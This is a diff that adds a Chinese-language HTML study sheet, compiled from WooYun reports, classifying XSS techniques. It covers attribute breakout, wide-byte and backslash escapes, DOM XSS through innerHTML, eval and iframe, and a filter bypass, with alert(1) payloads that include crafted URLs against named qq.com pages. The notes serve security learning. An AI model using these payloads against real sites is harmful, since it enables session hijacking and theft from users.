@@ -814,4 +814,300 @@ MathJax.Hub.Config({
   showProcessingMessages: false
 });
 </script>
-<title>XSSClassification</title></head><body><article class="markdown-body"></article></body></html>
+<title>XSSClassification</title></head><body><article class="markdown-body"><h1>
+<a name="user-content-xss-%E5%88%86%E7%B1%BB" class="anchor" href="#xss-%E5%88%86%E7%B1%BB" aria-hidden="true"><span class="octicon octicon-link"></span></a>XSS 分类</h1>
+
+<h4>
+<a name="user-content-%E6%95%B4%E7%90%86%E8%87%AA%E4%B9%8C%E4%BA%91" class="anchor" href="#%E6%95%B4%E7%90%86%E8%87%AA%E4%B9%8C%E4%BA%91" aria-hidden="true"><span class="octicon octicon-link"></span></a>整理自乌云</h4>
+
+<ul>
+<li>什么都没过滤的情况</li>
+<li>
+<p>输出在<code>&lt;script&gt;&lt;script/&gt;</code>之间的</p>
+
+<p><code>new Image().src="..."</code> 或者 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+</li>
+<li>
+<p>输出在html里的</p>
+
+<p><code>http://xxx.com/search?word=hehe</code></p>
+
+<div class="highlight highlight-html"><pre><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"hehe"</span><span class="nt">&gt;</span>
+</pre></div>
+
+<p>修改为 <code>http://xxx.com/search?word=hehe" onclick="alert(1)</code></p>
+
+<p>则变成</p>
+
+<div class="highlight highlight-html"><pre><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"hehe"</span> <span class="na">onclick=</span><span class="s">"alert(1)"</span><span class="nt">&gt;</span>
+</pre></div>
+</li>
+<li>
+<p>宽字节注入</p>
+
+<p>URL 编码简介</p>
+
+<table>
+<thead>
+<tr>
+<th>sp</th>
+<th>"</th>
+<th>'</th>
+<th>,</th>
+<th>;</th>
+<th>&lt;</th>
+<th>&gt;</th>
+<th>?</th>
+<th>[</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>%20</td>
+<td>%22</td>
+<td>%27</td>
+<td>%2C</td>
+<td>%3B</td>
+<td>%3C</td>
+<td>%3E</td>
+<td>%3F</td>
+<td>%5B</td>
+</tr>
+</tbody>
+</table>
+
+<table>
+<thead>
+<tr>
+<th>]</th>
+<th>{</th>
+<th>o</th>
+<th>}</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>%5D</td>
+<td>%7B</td>
+<td>%7C</td>
+<td>%7D</td>
+</tr>
+</tbody>
+</table>
+
+<table>
+<thead>
+<tr>
+<th>newline</th>
+<th>[</th>
+<th>]</th>
+<th>|</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>space</td>
+<td>&amp;#91;</td>
+<td>&amp;#93;</td>
+<td>&amp;#124;</td>
+</tr>
+</tbody>
+</table>
+
+<p><code>http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%22;alert(1);//aaaaaa</code>
+中 <code>%22</code> 代表 <code>"</code>, 但是最后被过滤为 <code>&amp;quot;</code>：</p>
+
+<div class="highlight highlight-js"><pre><span class="kd">var</span> <span class="nx">gsTest</span> <span class="o">=</span> <span class="s2">"&amp;quot;;alert(1);//aaaaaa"</span><span class="p">;</span>
+</pre></div>
+
+<p>预想效果:</p>
+
+<div class="highlight highlight-js"><pre><span class="kd">var</span> <span class="nx">gsTest</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//aaaaaa";</span>
+</pre></div>
+
+<p>当html为gbxxxx系列编码时，改为如下:</p>
+
+<p><code>http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0%22;alert(1);//aaaaaa</code></p>
+
+<p>效果： </p>
+
+<div class="highlight highlight-js"><pre><span class="kd">var</span> <span class="nx">gsTest</span><span class="o">=</span> <span class="s2">"宽"</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//aaaaaa</span>
+</pre></div>
+
+<p>我试了在console里试了<code>decodeURI('%C0%5C')</code>等各种组合还是不明白真相...</p>
+
+<p>作者解释：至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。
+并不是因为%22变成了 %5c%22,而 %c0吃掉了后面的%5c （怎么吃的啊T^T）</p>
+</li>
+<li>
+<p>反斜杠</p>
+
+<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa"</span><span class="o">+</span><span class="s2">"&amp;from=bbb"</span><span class="o">+</span><span class="s2">"&amp;param="</span><span class="p">;</span><span class="c1">//comment</span>
+</pre></div>
+
+<p>可以用反斜杠 <code>\</code> 杀死 <code>"</code>，改成</p>
+
+<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa\"+"</span><span class="o">&amp;</span><span class="nx">from</span><span class="o">=</span><span class="mi">1</span><span class="c1">//"+"&amp;param=";</span>
+</pre></div>
+
+<p>问题： "字符串"&amp;from=1，这样是错误的，因为&amp;符号的优先级高， ("字符串"&amp;from)=1 是无法进行这种赋值操作，继续修改 </p>
+
+<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa\"+"</span><span class="o">&amp;</span><span class="nx">from</span><span class="o">==</span><span class="mi">1</span><span class="c1">//"+"&amp;param=";</span>
+</pre></div>
+
+<p>问题： from未定义，加一个函数定义（js会先解析定义），继续修改</p>
+
+<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa\"+"</span><span class="o">&amp;</span><span class="nx">from</span><span class="o">==</span><span class="mi">1</span><span class="p">;</span><span class="kd">function</span> <span class="nx">from</span><span class="p">(){}</span><span class="c1">//"+"&amp;param=";</span>
+</pre></div>
+
+<p>问题： 空格被转义为了 <code>&amp;nbsp;</code>， /**/替换空格，继续修改 </p>
+
+<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa\"+"</span><span class="o">&amp;</span><span class="nx">from</span><span class="o">==</span><span class="mi">1</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="kd">function</span><span class="cm">/**/</span><span class="nx">from</span><span class="p">(){}</span><span class="c1">//"+"&amp;param=";</span>
+</pre></div>
+</li>
+<li>
+<p>换行符</p>
+
+<p><code>%0a</code> 代表html中的换行，达到如下效果：</p>
+
+<div class="highlight highlight-js"><pre><span class="c1">//我是注释，我爱洗澡，哦～哦～哦～ [我是输出]</span>
+</pre></div>
+
+<p>变成</p>
+
+<div class="highlight highlight-js"><pre><span class="c1">//我是注释，我爱洗澡，哦～哦～哦～ [我是输出  换行符</span>
+<span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//我是输出]</span>
+</pre></div>
+</li>
+<li>
+<p>DOM XSS 显示输出</p>
+
+<div class="highlight highlight-js"><pre><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'test'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">"&lt;img src=1&gt;"</span><span class="p">;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">'....'</span><span class="p">);</span>
+<span class="nx">$</span><span class="p">(</span><span class="s1">'.class-name'</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">'...'</span><span class="p">);</span>
+</pre></div>
+
+<p><code>innerHTML = &lt;script&gt;alert(1)&lt;/script&gt;</code>无法触发，只能用<code>&lt;img&gt;</code>
+JS的字符串中的字符可以写为 unicode编码。
+如： <code>&lt;</code> 可以表示为 <code>\u003c</code> , <code>&gt;</code> 可以表示为 <code>\u003e</code></p>
+
+<div class="highlight highlight-js"><pre><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"a"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s2">"\u003cimg src=1\u003e"</span><span class="p">;</span>
+</pre></div>
+
+<p>在JS字符串里， &lt; 不光可以写为 \u003c，还可以写为 \x3c， &gt; 同样可以写为 \x3e, 是16进制编码</p>
+</li>
+<li>
+<p>DOM XSS 隐式输出</p>
+
+<div class="highlight highlight-html"><pre><span class="nt">&lt;object&gt;&lt;param</span> <span class="na">name=</span><span class="s">"movie"</span> <span class="na">value=</span><span class="s">"aaaaa"</span><span class="nt">&gt;</span>
+</pre></div>
+
+<p><code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa"&gt;&lt;/object&gt;&lt;img src="1" onerror="alert(1)</code></p>
+
+<p>通过隐式闭合标签进行注入，插入诸如<code>&lt;img&gt;</code>标签</p>
+
+<div class="highlight highlight-html"><pre><span class="nt">&lt;object&gt;&lt;param</span> <span class="na">name=</span><span class="s">"movie"</span> <span class="na">value=</span><span class="s">"aaaaa"</span><span class="nt">&gt;&lt;/object&gt;&lt;img</span> <span class="na">src=</span><span class="s">"1"</span> <span class="na">onerror=</span><span class="s">"alert(1)"</span><span class="nt">&gt;</span>
+</pre></div>
+
+<p>由于chrome已经过滤了<code>&lt; &gt;</code>两个符号，所以js代码过滤的是encode后的字符，相当于没过滤
+<code>decodeURIComponent</code> 的操作，会将 <code>%3c</code>, <code>%3e</code>，又变回 <code>&lt;</code>, <code>&gt;</code></p>
+
+<p>也可以构造URL如 <code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa%22%3E%3C/object%3E%3Cimg%20src=1%20onerror=alert(1)%3E</code> 以达到目的</p>
+</li>
+<li>
+<p>DOM XSS eval函数</p>
+
+<p>先看这个url: <code>http://kf.qq.com/search_app.shtml?key=aaaaa</code>
+通过在url后面加非法字符 <code>\</code> 构造 <code>http://http://kf.qq.com/search_app.shtml?key=aaaaa\</code>
+然后从控制台定位到错误代码，发现下面这段js</p>
+
+<div class="highlight highlight-js"><pre><span class="kd">var</span> <span class="nx">getarg</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">allargs</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"?"</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// 获得key=aaaa</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">allargs</span><span class="o">!=</span><span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">allargs</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">"="</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">args</span> <span class="o">=</span> <span class="nx">allargs</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"&amp;"</span><span class="p">);</span> <span class="c1">// 多arguments情况</span>
+        <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">arg</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s2">"="</span><span class="p">);</span>
+            <span class="nb">eval</span><span class="p">(</span><span class="s1">'this.'</span><span class="o">+</span><span class="nx">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s1">'="'</span><span class="o">+</span><span class="nx">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s1">'";'</span><span class="p">);</span> <span class="c1">// 直接用了this调用key</span>
+            <span class="c1">// 然后可以在页面里执行</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">};</span>
+</pre></div>
+
+<p>通过加分号断句，让自己的xss执行，那么可以把<code>this.key="aaaaa";</code> 变成 <code>this.key;alert(1);//="asdas"</code>
+让 <code>arg[0]</code> 变成 <code>key;alert(1);//</code>，把后面的用注释断句
+构造url: <code>http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaaa</code></p>
+
+<p>chrome中 <code>"</code> 会变成 <code>%22</code> 而失效</p>
+</li>
+<li>
+<p>DOM XSS iframe</p>
+
+<p>有时候，输出还会出现在  。
+iframe 的 src属性本来应该是一个网址，但是iframe之善变，使得它同样可以执行javascript，
+而且可以用不同的姿势来执行。这一类问题，我将其归为[路径可控]问题。
+当然上面说到的是普通的反射型XSS。有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src="[可控的url]"; 同样会导致XSS问题</p>
+
+<ul>
+<li>onload执行js</li>
+</ul>
+
+<div class="highlight highlight-html"><pre><span class="nt">&lt;iframe</span> <span class="na">onload=</span><span class="s">"alert(1)"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</pre></div>
+
+<ul>
+<li>src执行js</li>
+</ul>
+
+<div class="highlight highlight-html"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"javascript:alert(1)"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</pre></div>
+
+<ul>
+<li>chrome下data协议执行代码</li>
+</ul>
+
+<div class="highlight highlight-html"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</pre></div>
+
+<ul>
+<li>chrome下srcdoc属性，变体</li>
+</ul>
+
+<div class="highlight highlight-html"><pre><span class="nt">&lt;iframe</span> <span class="na">srcdoc=</span><span class="s">"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</pre></div>
+</li>
+<li>
+<p>DOM XSS 路径</p>
+
+<p>一些程序员会动态的加载json数据，同域的时候，可以使用ajax；而有时候，数据所在域和当前页面所在域又不一致。所以需要跨域请求。跨域请求数据的手段中，有一种叫做jsonp。</p>
+
+<p>用代码表示的话，就是
+<code>somescript.src="http://otherdomain.com/xx?jsonp=callback"</code></p>
+
+<p>某些时候，程序员会在调用外部数据的时候带上可控的参数。</p>
+
+<p><code>somescript.src="http://otherdomain.com/xx?jsonp=callback&amp;id="+id;</code></p>
+
+<p>如果这个id我们可控，将可能带来XSS问题</p>
+
+<ol>
+<li>
+<code>script src="完全可控"</code> ,这种就简单了，直接将地址换为我们的JS地址</li>
+<li><code>script src="/path/xxx/[路径可控]/1.js"</code></li>
+</ol>
+</li>
+<li>
+<p>XSS 过滤器绕过</p>
+
+<p><code>&lt;img src=1 onerror=alert(1)&gt;</code> 被和谐为 <code>&lt;img src=1 onerror&gt;</code>
+改为 <code>&lt;script src=data:,alert(1)&lt;!--</code></p>
+</li>
+<li>
+<p>存储型 XSS</p>
+
+<p>可以套现的各种XSS技巧，HTML标签
+<a href="http://html5sec.org/">HTML5 Security Cheatsheet</a></p>
+</li>
+</ul>
+</article></body></html>
